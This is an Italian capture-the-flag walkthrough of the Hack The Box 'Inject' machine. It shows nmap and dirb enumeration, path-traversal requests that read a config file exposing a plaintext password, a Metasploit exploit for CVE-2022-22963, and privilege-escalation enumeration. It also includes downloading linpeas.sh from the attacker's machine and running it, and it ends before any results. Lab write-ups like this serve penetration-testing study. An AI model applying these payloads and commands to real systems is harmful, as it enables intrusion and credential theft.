---------------------------------------------------------------------------------------------------------------
nmap -A -Pn -n -vvv 10.10.11.204

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


---------------------------------------------------------------------------------------------------------------
Creiamo il record nel file degli host name 
sudo vi /etc/hosts
[ip]	[host]
sudo echo "10.10.11.204  inject.htb" >> /etc/hosts

---------------------------------------------------------------------------------------------------------------
Effettuiamo una scansione con dirb 
dirb http://inject.htb:8080 -w /usr/share/wordlists/dirb/common.txt

---- Scanning URL: http://inject.htb:8080/ ----
+ http://inject.htb:8080/blogs (CODE:200|SIZE:5371)                                                                                                                                                                                       
+ http://inject.htb:8080/environment (CODE:500|SIZE:712)                                                                                                                                                                                  
+ http://inject.htb:8080/error (CODE:500|SIZE:106)                                                                                                                                                                                        
+ http://inject.htb:8080/register (CODE:200|SIZE:5654)                                                                                                                                                                                    
+ http://inject.htb:8080/upload (CODE:200|SIZE:1857)     

---------------------------------------------------------------------------------------------------------------
Analizziamo la pagina http://inject.htb:8080/upload
Si possono caricare solo immagini, facciamo qualche test con burpsuite.

Ho inserito un testo a caso nella richiesta con burp e otteniamo una risposta corretta dalla pagina
[Screenshot_1.png]

Effettuiamo un'altra richiesta, però al seguente link 
GET /show_image?img=png.png HTTP/1.1

[TRAVERSAL_PATH]
Giocando un po' con il parametro GET, notiamo che possiamo navigare nelle cartelle mettendo un path in img=
GET /show_image?img=../../ 
GET /show_image?img=../../../../../../home -> Scopriamo ci sono 2 utenti: frank e phil

GET /show_image?img=../../../../../../home/frank/.m2/settings.xml 
<servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>

Sul sito non sono riuscito a trovare nessun form di login.

GET /show_image?img=../../../../../../home/phil/user.txt -> VUOTO

Continuo la ricerca e vedo che c'è una WebApp con Spring
GET /show_image?img=../../../../../../var/www/WebApp/HELP.md
GET /show_image?img=../../../../../../var/www/WebApp/pom.xml

Cerco qualche vulnerabilità su springframework
Trovo questa vulnerabilità CVE-2022-22963 - Spring Cloud Function SpEL RCE
https://www.rapid7.com/blog/post/2022/04/01/metasploit-weekly-wrap-up-155/
---------------------------------------------------------------------------------------------------------------
sudo msfconsole
use exploit/multi/http/spring_cloud_function_spel_injection
---------------------------------------------------------------------------------------------------------------
Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
python3 -c 'import pty; pty.spawn("/bin/bash")'

Cerchiamo se l'utente è tra i sudoers
sudo -l

Cerchiamo se l'utente ha SUID
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null

Visualizziamo i log del sistema
cat /var/log/audit/audit.log

Cerchiamo file scrivibili
find /-writable -type d 2>/dev/null

Verifichiamo la presenza di backup che possano essere utili
apache, db ecc.

Controlliamo anche i cronjob
cat /etc/crontab

Scarichiamo linpeas.sh, attiviamo il server sulla nostra macchina e scarichiamo nella macchina attaccata
sudo python -m SimpleHTTPServer 80
wget http://10.10.15.9:80/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh > linpeas

Analizziamo linpeas


---------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------
